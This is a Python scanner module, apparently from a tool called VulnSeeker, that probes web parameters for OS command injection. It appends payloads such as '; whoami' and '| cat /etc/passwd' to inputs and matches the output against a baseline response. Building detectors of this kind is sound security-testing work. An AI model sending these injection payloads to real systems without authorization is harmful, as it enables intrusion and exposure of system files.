import requests
import logging
import re
from core.models import ScannerModule, Vulnerability, Target, Severity

logger = logging.getLogger("VulnSeeker.CmdInjection")


class CommandInjectionScanner(ScannerModule):
    """
    Escáner de Inyección de Comandos (OS Command Injection).
    Intenta ejecutar comandos del sistema operativo concatenando operadores.
    """

    @property
    def name(self) -> str:
        return "OS Command Injection"

    @property
    def description(self) -> str:
        return "Detecta ejecución remota de comandos (RCE) mediante operadores de sistema (;, &&, |)."

    def run(self, target: Target) -> list[Vulnerability]:
        vulns = []

        # Payloads para provocar ejecución remota
        payloads = [
            ("; whoami", "root"),  # Linux
            ("; whoami", "www-data"),  # Apache
            ("&& whoami", "root"),
            ("&& whoami", "www-data"),
            ("| whoami", "root"),
            ("| whoami", "www-data"),
            ("; cat /etc/passwd", "root:x:0:0"),
            ("&& cat /etc/passwd", "root:x:0:0"),
            ("| cat /etc/passwd", "root:x:0:0"),
        ]

        # Obtener params del PageElement si existe
        element_params = {}
        if target.elements:
            element_params = target.elements[0].params

        params_to_test = []

        if element_params:
            params_to_test = list(element_params.keys())

        elif "?" in target.url:
            try:
                query_string = target.url.split("?")[1]
                for pair in query_string.split("&"):
                    if "=" in pair:
                        key = pair.split("=")[0]
                        params_to_test.append(key)
            except Exception:
                pass

        # Si no hay nada, probamos sospechosos comunes
        if not params_to_test:
            params_to_test = ['ip', 'host', 'domain', 'ping', 'addr', 'cmd', 'exec', 'target']

        logger.info(f"🐚 CmdInjection: Probando {len(params_to_test)} parámetros en {target.url}")

        headers = {'User-Agent': 'VulnSeeker/1.0'}
        if target.headers:
            headers.update(target.headers)

        session = requests.Session()

        # Obtener respuesta baseline para descartar falsos positivos pre-existentes
        baseline_text = ""
        try:
            if target.method == "POST":
                post_data = element_params.copy() if element_params else {}
                resp_base = session.post(target.url, data=post_data, headers=headers, timeout=5, verify=False)
            else:
                resp_base = session.get(target.url, headers=headers, timeout=5, verify=False)
            baseline_text = resp_base.text
        except Exception:
            pass

        for param in params_to_test:
            for payload, expected_string in payloads:
                attack_val = f"127.0.0.1{payload}"

                # --- LÓGICA CORREGIDA: PRESERVAR PARÁMETROS ---
                attack_url = target.url
                data = {}

                if target.method == "POST":
                    # Copiamos los parámetros originales para no perder el botón 'Submit'
                    if element_params:
                        data = element_params.copy()

                    # Inyectamos solo en el parámetro actual
                    data[param] = attack_val

                else:  # GET
                    if "?" in target.url and param in target.url:
                        attack_url = re.sub(f"{param}=[^&]*", f"{param}={attack_val}", target.url)
                    else:
                        sep = "&" if "?" in attack_url else "?"
                        attack_url = f"{attack_url}{sep}{param}={attack_val}"

                try:
                    if target.method == "POST":
                        resp = session.post(attack_url, data=data, headers=headers, timeout=5, verify=False)
                    else:
                        resp = session.get(attack_url, headers=headers, timeout=5, verify=False)

                    # Solo es RCE si la evidencia aparece tras el ataque y NO estaba
                    # ya presente en la respuesta baseline (descarta falsos positivos).
                    if expected_string in resp.text and expected_string not in baseline_text:
                        desc = (f"Se detectó Inyección de Comandos (RCE).\n"
                                f"El servidor ejecutó: '{payload.strip()}'\n"
                                f"Output encontrado: '{expected_string}'")

                        v = Vulnerability(
                            name="OS Command Injection (RCE)",
                            severity=Severity.CRITICAL,
                            description=desc,
                            target_url=target.url,
                            evidence=f"Payload: {attack_val} | Found: {expected_string}",
                            payload=attack_val
                        )
                        vulns.append(v)
                        logger.info(f"💥 ¡COMMAND INJECTION DETECTADO! Param: {param}")
                        break

                except Exception:
                    pass

        return vulns
